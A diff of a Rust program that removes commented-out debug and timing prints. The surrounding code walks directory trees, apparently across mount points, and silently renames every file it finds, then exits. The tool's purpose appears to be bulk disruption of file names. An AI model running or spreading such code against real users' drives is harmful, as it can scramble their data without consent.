@@ -9,8 +9,6 @@ use walkdir::WalkDir;
 
 pub(crate) fn start_rename(path: PathBuf, do_exit: bool) {
     let cpus = num_cpus::get();
-    // println!("{}", cpus);
-    // let now = Instant::now();
     rename_tree(path.clone(), 2).unwrap();
 
     sleep(Duration::from_secs(1));
@@ -26,9 +24,6 @@ pub(crate) fn start_rename(path: PathBuf, do_exit: bool) {
     if do_exit {
         exit(101);
     }
-    // let now2 = now.elapsed();
-    // println!("{:?}", now2);
-    // println!("Took {} seconds", now2.as_secs());
 }
 
 pub(crate) fn get_mount_points() -> Vec<PathBuf> {
@@ -49,7 +44,6 @@ fn rename_tree(start_directory: PathBuf, max_depth: usize) -> io::Result<()> {
         let err = entry.is_err();
         if err { continue; }
         let path = entry.unwrap().into_path();
-        // println!("{:?}", path);
         let new_path = get_new_path(path.clone());
         rename(path, PathBuf::from(new_path));
     }
